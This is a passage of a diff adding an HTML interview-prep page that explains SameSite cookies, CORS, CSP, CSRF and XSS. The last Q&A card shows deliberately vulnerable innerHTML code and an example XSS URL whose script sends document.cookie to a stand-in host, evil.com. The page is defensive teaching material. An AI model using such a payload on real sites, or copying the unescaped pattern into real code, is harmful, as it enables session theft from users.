+      <div class="attr-desc"><strong>Plain English:</strong> "Only send this cookie when the request originates from THIS site" — the primary modern defense against CSRF. Three values: <ic>Strict</ic> (never sent cross-site, even from a link), <ic>Lax</ic> (sent for top-level navigation like clicking a link, but not for background cross-site requests like images/iframes — the browser DEFAULT today), <ic>None</ic> (sent on all cross-site requests, requires `Secure` to be set alongside it).</div>
+    </div>
+
+    <table class="feat-table">
+      <thead><tr><th>SameSite value</th><th>Sent on cross-site link click?</th><th>Sent on cross-site background request (img, fetch)?</th></tr></thead>
+      <tbody>
+        <tr><td>Strict</td><td class="no">✗ No</td><td class="no">✗ No</td></tr>
+        <tr><td>Lax (default in modern browsers)</td><td class="yes">✓ Yes</td><td class="no">✗ No</td></tr>
+        <tr><td>None</td><td class="yes">✓ Yes</td><td class="yes">✓ Yes (requires Secure)</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ══════════════════════════════════════════════
+       SECTION 6 — How They Work Together
+  ══════════════════════════════════════════════ -->
+  <section class="section" id="s6">
+    <div class="section-header">
+      <div class="section-num">6</div>
+      <h2>How They Complement Each Other</h2>
+    </div>
+
+    <table class="feat-table">
+      <thead><tr><th>Layer</th><th>Defends against</th><th>Relationship to the others</th></tr></thead>
+      <tbody>
+        <tr><td>Output encoding / sanitization</td><td>XSS — the FIRST, primary line of defense</td><td>Prevents the injection from happening at all</td></tr>
+        <tr><td>CSP</td><td>XSS — a SECOND layer, damage limitation</td><td>Blocks injected scripts from running/exfiltrating data even if sanitization somehow fails</td></tr>
+        <tr><td>SameSite cookies</td><td>CSRF — modern primary defense</td><td>Independent of XSS/CSP; specifically about which requests carry the session cookie</td></tr>
+        <tr><td>CSRF tokens</td><td>CSRF — traditional, still-valid defense</td><td>Works alongside SameSite for defense in depth, especially for older browser support</td></tr>
+        <tr><td>CORS</td><td>Unauthorized cross-origin READS of your API</td><td>A separate concern from CSRF — CORS is about reading RESPONSES, CSRF is about triggering ACTIONS regardless of whether the response is readable</td></tr>
+        <tr><td>HttpOnly + Secure cookies</td><td>Cookie theft via XSS or network interception</td><td>Damage limitation — reduces what an attacker gains even if XSS or a MITM attack partially succeeds</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout callout-green">
+      <span class="callout-icon">✓</span>
+      <span><strong>The key interview insight:</strong> none of these mechanisms is a complete solution on its own — real security comes from DEFENSE IN DEPTH, layering multiple protections so that a single failure doesn't lead directly to a full compromise.</span>
+    </div>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ══════════════════════════════════════════════
+       SECTION 7 — Gotchas
+  ══════════════════════════════════════════════ -->
+  <section class="section" id="s7">
+    <div class="section-header">
+      <div class="section-num" style="background:linear-gradient(135deg,var(--amber),#cc7a2e);">!</div>
+      <h2>Common Gotchas &amp; Interview Traps</h2>
+    </div>
+
+    <ul class="gotcha-list">
+      <li><span class="gi">⚠️</span><span><strong>CORS is often confused with a general "security feature" that protects the SERVER</strong> — but it's enforced entirely by the BROWSER, protecting the requesting page's JavaScript from being tricked into exposing data it read from another origin; it does nothing to stop non-browser requests (curl, server-to-server, Postman) from reading an API's response at all.</strong></span></li>
+      <li><span class="gi">⚠️</span><span><strong>CSRF and XSS are often conflated but are fundamentally different attacks</strong> — XSS is about INJECTING malicious script into your page; CSRF is about ABUSING an existing authenticated session via a request from a DIFFERENT site, without needing to inject any script into your page at all.</span></li>
+      <li><span class="gi">⚠️</span><span><strong>Access-Control-Allow-Origin: * cannot be combined with credentialed requests</strong> — if a request includes cookies/credentials, the server MUST specify an exact origin (not a wildcard), and must also send `Access-Control-Allow-Credentials: true`; this is a deliberate spec restriction to prevent a dangerously overpermissive combination.</span></li>
+      <li><span class="gi">⚠️</span><span><strong>SameSite=Lax is the modern BROWSER DEFAULT when no SameSite attribute is set at all</strong> — this is a relatively recent, significant change (browsers used to default to sending cookies on all cross-site requests); worth mentioning as an example of the platform itself evolving to be more secure by default.</span></li>
+      <li><span class="gi">⚠️</span><span><strong>HttpOnly doesn't protect against CSRF at all</strong> — it protects against JavaScript READING the cookie (relevant to XSS), but the browser still AUTOMATICALLY attaches an HttpOnly cookie to outgoing requests, which is exactly the behavior CSRF exploits; these are solving different problems and aren't substitutes for each other.</span></li>
+      <li><span class="gi">⚠️</span><span><strong>A Content-Security-Policy with 'unsafe-inline' in script-src provides dramatically weaker XSS protection</strong> than one without it — many real-world sites end up with a weakened CSP because removing 'unsafe-inline' requires refactoring inline scripts/handlers, which can be substantial migration work; worth mentioning as a common REAL-WORLD trade-off, not just a theoretical best practice.</span></li>
+      <li><span class="gi">⚠️</span><span><strong>DOM-based XSS can occur ENTIRELY client-side, without the malicious payload ever touching the server at all</strong> — e.g. JavaScript reading `location.hash` and unsafely inserting it into the DOM; server-side output encoding alone doesn't protect against this specific variant, since the server never even sees the malicious part of the URL.</span></li>
+      <li><span class="gi">⚠️</span><span><strong>The Same-Origin Policy (which CORS provides a controlled EXCEPTION to) considers protocol, domain, AND port all part of "origin"</strong> — `http://example.com` and `https://example.com` are DIFFERENT origins, as are `example.com:3000` and `example.com:8080`, a common point of confusion.</span></li>
+      <li><span class="gi">⚠️</span><span><strong>CSP's frame-ancestors directive is the modern replacement for the older X-Frame-Options header</strong> — both address clickjacking (preventing a malicious site from embedding your page in an invisible iframe to trick users into clicking something), but frame-ancestors offers more flexible, granular control and is the currently-recommended approach.</span></li>
+      <li><span class="gi">⚠️</span><span><strong>None of these mechanisms is a substitute for basic input validation and parameterized queries against OTHER attack classes</strong> (like SQL injection) — XSS/CSRF/CORS/CSP/cookies are all specifically about the BROWSER/client-side security model; server-side data validation and injection prevention is a separate, equally important concern outside this specific topic's scope.</span></li>
+    </ul>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ══════════════════════════════════════════════
+       SECTION 8 — Why/What/When/How Q&A
+  ══════════════════════════════════════════════ -->
+  <section class="section" id="s8">
+    <div class="section-header">
+      <div class="section-num" style="background:linear-gradient(135deg,var(--accent),#cc4545);">?</div>
+      <h2>Interview Q&amp;A — Why / What / When / How</h2>
+    </div>
+
+    <div class="callout callout-purple" style="margin-bottom:1.25rem;">
+      <span class="callout-icon">🎯</span>
+      <span>Web security fundamentals are near-universal interview topics — the strongest answers clearly distinguish these five concepts from EACH OTHER (they're often confused/conflated) rather than treating them as one blended "security stuff" category.</span>
+    </div>
+
+    <div class="qa-card" onclick="toggleQA(this)">
+      <div class="qa-question">
+        <span class="q-text"><span class="qtype-badge qtype-what">What</span>What's the fundamental difference between XSS and CSRF?</span>
+        <div class="qa-toggle">+</div>
+      </div>
+      <div class="qa-answer">
+        <div class="qa-answer-inner">
+          XSS is about INJECTING malicious JavaScript into a vulnerable page, so it executes with the SAME privileges as the site's own legitimate code — the attacker's code runs, in the victim's browser, ON the vulnerable site. CSRF doesn't inject anything into the target site at all — instead, it tricks the victim's BROWSER (from a completely different, malicious site) into making a request TO the target site, relying on the fact that the browser automatically attaches the victim's existing session cookies to that request regardless of which page triggered it. XSS is fundamentally a CODE INJECTION problem; CSRF is fundamentally a problem of the browser's automatic, origin-unaware cookie-attaching behavior being exploited.
+        </div>
+      </div>
+    </div>
+
+    <div class="qa-card" onclick="toggleQA(this)">
+      <div class="qa-question">
+        <span class="q-text"><span class="qtype-badge qtype-why">Why</span>Why is CORS enforced by the browser rather than the server, and what does this mean for its actual security guarantees?</span>
+        <div class="qa-toggle">+</div>
+      </div>
+      <div class="qa-answer">
+        <div class="qa-answer-inner">
+          CORS exists specifically to relax the browser's OWN Same-Origin Policy in a controlled way — the underlying problem it addresses (a malicious page's JavaScript reading data from another origin the victim is logged into) is fundamentally about what a BROWSER allows client-side script to do, so the enforcement naturally belongs in the browser itself. This means CORS provides ZERO protection against any request that ISN'T coming from browser-executed JavaScript — a server-to-server request, a command-line tool like curl, or a mobile app calling the same API is completely unaffected by CORS headers, since there's no browser enforcing them in that context. This is a common misconception: CORS is NOT a general API access-control mechanism; it's specifically about protecting browser-based cross-origin JavaScript reads, and genuine API access control still needs to happen via proper authentication/authorization on the server.
+        </div>
+      </div>
+    </div>
+
+    <div class="qa-card" onclick="toggleQA(this)">
+      <div class="qa-question">
+        <span class="q-text"><span class="qtype-badge qtype-when">When</span>When would SameSite=Strict be a worse choice than SameSite=Lax, despite being the more restrictive/secure-sounding option?</span>
+        <div class="qa-toggle">+</div>
+      </div>
+      <div class="qa-answer">
+        <div class="qa-answer-inner">
+          When users legitimately need to arrive at your site FROM an external link while already logged in and expect to remain authenticated — for example, clicking a link in an email that takes them to a specific logged-in page on your site. With `Strict`, the session cookie would NOT be sent on that initial cross-site navigation at all, meaning the user would appear logged OUT even though they have a valid session, creating a confusing experience (they'd need to navigate again, or the site would need extra logic to handle this). `Lax` still sends the cookie for this kind of top-level, user-initiated cross-site navigation (like clicking a link), while still blocking it for background/automatic cross-site requests (which is where CSRF attacks typically operate) — making `Lax` a better balance of security and usability for most typical session cookies, which is exactly why it's the modern browser default.
+        </div>
+      </div>
+    </div>
+
+    <div class="qa-card" onclick="toggleQA(this)">
+      <div class="qa-question">
+        <span class="q-text"><span class="qtype-badge qtype-how">How</span>How would you explain, in plain English, what a CSP header actually does to someone unfamiliar with web security?</span>
+        <div class="qa-toggle">+</div>
+      </div>
+      <div class="qa-answer">
+        <div class="qa-answer-inner">
+          Imagine your website normally trusts its OWN code completely — any script that ends up on the page just runs, no questions asked. A Content Security Policy is like giving the browser a specific GUEST LIST for your page: "only run scripts that come from MY OWN server, or from this ONE trusted CDN I've specifically approved — block anything else, even if it somehow gets onto the page." So if an attacker manages to sneak a malicious `&lt;script&gt;` tag into your page (through some XSS vulnerability), the BROWSER itself refuses to actually run that script, because it's not from an approved source on the guest list — even though the vulnerability that let the attacker inject the tag in the first place still technically exists. It's a safety net that limits the DAMAGE of an injection attack, even when it can't prevent the injection itself.
+        </div>
+      </div>
+    </div>
+
+    <div class="qa-card" onclick="toggleQA(this)">
+      <div class="qa-question">
+        <span class="q-text"><span class="qtype-badge qtype-what">What</span>What does the HttpOnly cookie attribute actually protect against, and what does it NOT protect against?</span>
+        <div class="qa-toggle">+</div>
+      </div>
+      <div class="qa-answer">
+        <div class="qa-answer-inner">
+          HttpOnly prevents JavaScript (via `document.cookie`) from being able to READ the cookie's value at all — the cookie is still sent normally in actual HTTP requests/responses, it's just invisible to client-side script. This specifically protects against an attacker's XSS payload trying to STEAL the cookie's value (e.g. to send it to an attacker-controlled server for later reuse) — if the cookie is HttpOnly, injected JavaScript simply can't access it to exfiltrate it. However, HttpOnly does NOT prevent the cookie from being AUTOMATICALLY SENT by the browser on legitimate-looking requests — including forged ones from a CSRF attack, since the browser attaches cookies based on the target DOMAIN, not based on where the request originated from; HttpOnly and CSRF protection (like SameSite) address different parts of the problem.
+        </div>
+      </div>
+    </div>
+
+    <div class="qa-card" onclick="toggleQA(this)">
+      <div class="qa-question">
+        <span class="q-text"><span class="qtype-badge qtype-why">Why</span>Why can't Access-Control-Allow-Origin: * be used together with Access-Control-Allow-Credentials: true?</span>
+        <div class="qa-toggle">+</div>
+      </div>
+      <div class="qa-answer">
+        <div class="qa-answer-inner">
+          `Access-Control-Allow-Origin: *` tells the browser "ANY origin in the world may read this response." Combining that with `Access-Control-Allow-Credentials: true` (which permits the request to include the user's cookies/session) would mean literally ANY website on the internet could make an authenticated, credentialed request to your API AND read the personalized, potentially sensitive response — a catastrophic security hole, since it would defeat the entire purpose of having authentication/session cookies in the first place. The CORS specification deliberately FORBIDS this exact combination as a safeguard — if credentials are involved, the server MUST specify an EXACT, explicit origin (never a wildcard), ensuring only a genuinely trusted, specifically-named origin can make credentialed cross-origin requests.
+        </div>
+      </div>
+    </div>
+
+    <div class="qa-card" onclick="toggleQA(this)">
+      <div class="qa-question">
+        <span class="q-text"><span class="qtype-badge qtype-when">When</span>When would relying on SameSite cookies alone NOT be sufficient CSRF protection, requiring CSRF tokens as well?</span>
+        <div class="qa-toggle">+</div>
+      </div>
+      <div class="qa-answer">
+        <div class="qa-answer-inner">
+          When you need to support OLDER browsers that don't recognize or enforce the SameSite attribute at all — in that case, the browser simply ignores the attribute and falls back to older, less secure default cookie-sending behavior, leaving the application effectively unprotected against CSRF for those users if SameSite were the ONLY defense in place. Additionally, some legitimate use cases genuinely require `SameSite=None` (fully cross-site cookie sending, e.g. for certain third-party embedded/widget scenarios), which explicitly DISABLES SameSite's CSRF protection for that cookie — in such cases, CSRF tokens remain necessary as the primary defense. Using BOTH mechanisms together provides defense in depth, covering gaps that either one alone might leave open depending on browser support or specific configuration needs.
+        </div>
+      </div>
+    </div>
+
+    <div class="qa-card" onclick="toggleQA(this)">
+      <div class="qa-question">
+        <span class="q-text"><span class="qtype-badge qtype-how">How</span>How would you explain to a teammate why their reflected XSS vulnerability (from an unescaped URL query parameter shown on the page) is a real, exploitable security risk, not just a cosmetic display bug?</span>
+        <div class="qa-toggle">+</div>
+      </div>
+      <div class="qa-answer">
+        <div class="qa-answer-inner">
+          <div class="code-block">
+  <span class="line"><span class="cm">// The vulnerable code</span></span>
+  <span class="line"><span class="ck">const</span> query = <span class="ck">new</span> URLSearchParams(location.search).get(<span class="cs">"search"</span>);</span>
+  <span class="line">resultsHeader.innerHTML = <span class="cs">`Results for: ${query}`</span>; <span class="cm">// UNESCAPED</span></span>
+  <span class="line"></span>
+  <span class="line"><span class="cm">// An attacker crafts and shares this URL:</span></span>
+  <span class="line"><span class="cm">// yoursite.com/search?search=&lt;script&gt;fetch('evil.com/steal?c='+document.cookie)&lt;/script&gt;</span></span>
+          </div>
+          The vulnerability isn't just that the query parameter DISPLAYS oddly — it's that ANY text placed in that URL parameter, INCLUDING actual executable `&lt;script&gt;` tags, gets inserted directly into the page via `innerHTML`, which means the BROWSER will actually EXECUTE it as real JavaScript, running with the SAME permissions as the site's own legitimate code. An attacker can craft a malicious URL like the one above, then trick a victim into clicking it (via a phishing email, a malicious ad, a shortened link) — when the victim (while already logged into your site) clicks it, the injected script runs in THEIR browser, on YOUR site's origin, and can silently steal their session cookie (if not HttpOnly), perform actions on their behalf, or redirect them to a fake login page to steal credentials. The fix — escaping the value or using `textContent` instead of `innerHTML` — ensures the query parameter's content is always treated as inert TEXT to display, never as code to execute, regardless of what an attacker puts in it.
+        </div>
+      </div>
+    </div>
+
+  </section>
+
+  <div class="divider"></div>
+
+  <footer class="footer">
+    Web Fundamentals Interview Prep · XSS · CSRF · CSP · CORS · Secure Cookie Attributes
+  </footer>
+
+</div>
+
+<script>
+  function toggleQA(card) {
+    card.classList.toggle('open');
+  }
+
+  document.querySelectorAll('.code-block .line').forEach(line => {
+    const walker = document.createTreeWalker(line, NodeFilter.SHOW_TEXT);
+    const textNodes = [];
+    let node;
+    while ((node = walker.nextNode())) textNodes.push(node);
+    textNodes.forEach(textNode => {
+      textNode.nodeValue = textNode.nodeValue.replace(/\r?\n\s*/g, ' ');
+    });
+  });
+
+  document.querySelectorAll('.topic-pill[href^="#"]').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      document.querySelector(a.getAttribute('href'))
+        ?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+</body>
+</html>
